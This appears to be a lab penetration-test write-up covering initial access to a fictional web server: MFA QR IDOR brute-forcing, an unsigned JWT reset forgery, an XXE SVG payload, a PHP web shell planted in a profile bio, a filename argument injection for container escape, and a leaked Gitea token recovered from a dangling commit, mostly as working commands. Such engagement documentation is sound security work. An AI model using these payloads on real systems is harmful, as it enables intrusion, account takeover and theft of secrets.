# 01 · WEB01 — Initial Access

**Host:** WEB01 (172.16.30.100) · **Role:** Public-facing web application server (DMZ, non-domain-joined)
**Starting access:** None — unauthenticated, external attacker perspective. First file in the chain.

## Objective

Establish an initial foothold on Apexfiend's public perimeter by chaining several independent web application vulnerabilities, ultimately achieving code execution inside WEB01's application container and escaping to the underlying host as a low-privileged user.

## Prerequisites

- None. This is the entry point of the engagement.
- Only requirement: network reachability to WEB01 (172.16.30.100) over HTTP(S).

## Enumeration

### Web presence

```bash
whatweb http://172.16.30.100
nmap -p- -sV -T4 172.16.30.100
```

Confirms a public-facing corporate site with a visible "Guest Portal" / webmail link (`apex-guest.lab`) used for visitor/contractor self-registration — the application's intended low-trust entry point.

### Application mapping

Manual crawl + Burp Suite passive spidering of the portal identifies:

- `/portal/register` — self-service account creation (ties to `apex-guest.lab` disposable webmail)
- `/portal/profile` — authenticated profile page, including a bio field and avatar/document upload
- `/portal/mfa/qr?uid=<id>` — endpoint returning a TOTP enrollment QR code
- `/portal/password/reset` — JWT-based password reset flow

## Exploitation

### Step 1 — Register a low-privilege account

Self-register via `/portal/register` using the disposable webmail at `apex-guest.lab` to receive the verification email. No approval step is enforced — any email on that domain is accepted.

```bash
curl -s -X POST http://172.16.30.100/portal/register \
  -d "email=attacker@apex-guest.lab&username=attacker01&password=<PASSWORD>"
```

Result: a standard, low-privilege portal account with session cookie `<SESSION_1>`.

### Step 2 — IDOR on the MFA QR endpoint (F-01)

The `/portal/mfa/qr` endpoint trusts a client-supplied header (`X-User-Ref`) containing an **MD5 hash of the numeric user ID**, instead of deriving identity from the authenticated session server-side.

```bash
# Confirm our own numeric ID → hash mapping first
curl -s http://172.16.30.100/portal/mfa/qr \
  -H "Cookie: session=<SESSION_1>" \
  -H "X-User-Ref: $(echo -n '<OUR_NUMERIC_ID>' | md5sum | cut -d' ' -f1)"
```

Since the IDs are low, sequential integers, brute-forcing low numeric IDs (admin accounts are typically created first) and hashing each candidate client-side reveals a valid low-ID account's TOTP QR code:

```bash
for id in $(seq 1 20); do
  hash=$(echo -n "$id" | md5sum | cut -d' ' -f1)
  curl -s http://172.16.30.100/portal/mfa/qr \
    -H "Cookie: session=<SESSION_1>" \
    -H "X-User-Ref: $hash" -o "qr_${id}.png"
done
```

Inspecting the resulting QR images identifies one belonging to an administrative account (`admin@apexfiend.lab` — confirmed from the `otpauth://` label encoded in the QR). Decoding it yields the TOTP seed:

```bash
zbarimg qr_<id>.png
# otpauth://totp/Apexfiend:admin@apexfiend.lab?secret=<TOTP_SECRET>&issuer=Apexfiend
```

### Step 3 — Forgeable password reset token (F-02)

The reset flow issues a JWT that the server does **not** verify cryptographically on redemption — only decodes and trusts the payload claims.

```bash
# Request a reset for our own account to capture a valid-shaped token
curl -s -X POST http://172.16.30.100/portal/password/reset/request \
  -d "email=attacker@apex-guest.lab"
```

Decode the returned JWT to inspect its structure (no signature verification needed to understand the claim format):

```bash
echo "<CAPTURED_JWT>" | cut -d. -f2 | base64 -d 2>/dev/null | jq
# { "uid": <our_id>, "email": "attacker@apex-guest.lab", "exp": ... }
```

Forge a token with the `uid`/`email` claims swapped to the administrator's and the original (still-valid, unsigned-verification) signature segment reused:

```bash
python3 forge_jwt.py --uid <ADMIN_ID> --email admin@apexfiend.lab --alg none > admin_reset.jwt
```

```bash
curl -s -X POST http://172.16.30.100/portal/password/reset/confirm \
  -d "token=$(cat admin_reset.jwt)&new_password=<NEW_ADMIN_PASSWORD>"
```

Combined with the TOTP seed from Step 2, this gives full authenticated access as `admin` on the portal.

> This chain (F-01 + F-02) alone is sufficient for full account takeover and is independent of everything that follows — documented separately here because the subsequent steps (file upload, RCE) were pursued for deeper access to the underlying infrastructure rather than relying on the admin portal session alone.

### Step 4 — XXE via SVG upload (F-03)

The authenticated profile page accepts an avatar upload, including SVG, and parses it server-side without disabling external entity resolution.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="15">&xxe;</text>
</svg>
```

```bash
curl -s -X POST http://172.16.30.100/portal/profile/avatar \
  -H "Cookie: session=<ADMIN_SESSION>" \
  -F "avatar=@xxe_payload.svg"
```

The rendered SVG returned by the application embeds the contents of `config.php` as visible text, disclosing database connection strings and an internal application secret used later.

### Step 5 — LFI → RCE via profile bio (F-04)

The profile `bio` field is stored server-side as part of the user's session file. The application later `include()`s that session file when rendering certain pages — writing PHP into the bio field results in it being executed.

```bash
curl -s -X POST http://172.16.30.100/portal/profile \
  -H "Cookie: session=<ADMIN_SESSION>" \
  -d 'bio=<?php system($_GET["cmd"]); ?>'
```

Trigger inclusion and confirm execution:

```bash
curl -s "http://172.16.30.100/portal/dashboard?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms code execution as `www-data` inside the application's Docker container.

### Step 6 — Container escape via argument injection (F-05)

A background maintenance script on the container invokes an SVG-processing helper binary, passing the uploaded filename directly into its argument list without sanitization. An uploaded filename crafted as an injected argument breaks out of the intended single-argument invocation:

```bash
curl -s -X POST http://172.16.30.100/portal/profile/avatar \
  -H "Cookie: session=<ADMIN_SESSION>" \
  -F 'avatar=@payload.svg;filename=-e sh test.svg'
```

Once the helper's cron/trigger processes this filename, it spawns a shell on the **host**, outside the container boundary:

```bash
curl -s "http://172.16.30.100/portal/dashboard?cmd=id"
# uid=1001(dev) gid=1001(dev) groups=1001(dev),27(sudo)
```

Confirmed: code execution as host-level user `dev` on WEB01 itself, not just its container.

### Step 7 — Gitea token via dangling commit (F-06)

As `dev`, inspecting local shell history / bash profile reveals references to an internal dashboard project under source control. Cloning the public-facing "internal-dashboard" repository and walking its reflog/dangling commits (not visible on any branch, but still fetchable by hash) surfaces a commit that was force-pushed over, containing a hardcoded Gitea access token:

```bash
git clone http://gitea.corp.apexfiend.lab/internal/internal-dashboard.git
cd internal-dashboard
git log --all --source --oneline
git fsck --no-reflog | awk '/dangling commit/ {print $3}'
git show <dangling_commit_hash>
# diff reveals: GITEA_TOKEN=<LEAKED_TOKEN>
```

Using the leaked token against the Gitea API reveals access to a **private** repository, `developer-deployment`, not otherwise visible:

```bash
curl -s -H "Authorization: token <LEAKED_TOKEN>" \
  http://gitea.corp.apexfiend.lab/api/v1/repos/search?q=deployment
```

```bash
git clone http://<LEAKED_TOKEN>@gitea.corp.apexfiend.lab/internal/developer-deployment.git
```

This repository documents `DEV-LAPTOP` as a developer machine used for pre-production deployment, and its deployment scripts show a reliance on **SSH agent forwarding** from WEB01 back to DEV-LAPTOP during manual deploys — the pivot path covered in the next file.

## Result

- Full authenticated administrator access to the WEB01 portal application (F-01 + F-02).
- Disclosure of `config.php` contents via XXE (F-03).
- Remote code execution as `www-data` inside the application container (F-04).
- Container escape to host-level user `dev` on WEB01 (F-05).
- A valid Gitea access token and knowledge of DEV-LAPTOP as the next pivot target, including its reliance on forwarded SSH agent sockets (F-06).

## Screenshots

- [ ] Screenshot: Brute-forced TOTP QR for the admin account
- [ ] Screenshot: Decoded/forged JWT reset token structure
- [ ] Screenshot: XXE response disclosing `config.php`
- [ ] Screenshot: RCE confirmation (`id` as `www-data`)
- [ ] Screenshot: Container escape confirmation (`id` as `dev`)
- [ ] Screenshot: Dangling commit diff revealing the Gitea token
- [ ] Screenshot: Private `developer-deployment` repo contents

## Next Step

→ `02-dev-laptop-pivot.md` — uses the live forwarded SSH agent socket on WEB01 (discovered via the `developer-deployment` repo) to pivot to DEV-LAPTOP as `dev`.

## References

- `docs/08-attack-paths/initial-access.md` — reasoning-level narrative for this stage
- `docs/09-reporting/` — Section 8, findings F-01 through F-06
- `docs/01-architecture/` *(if present)* — WEB01's place in network architecture
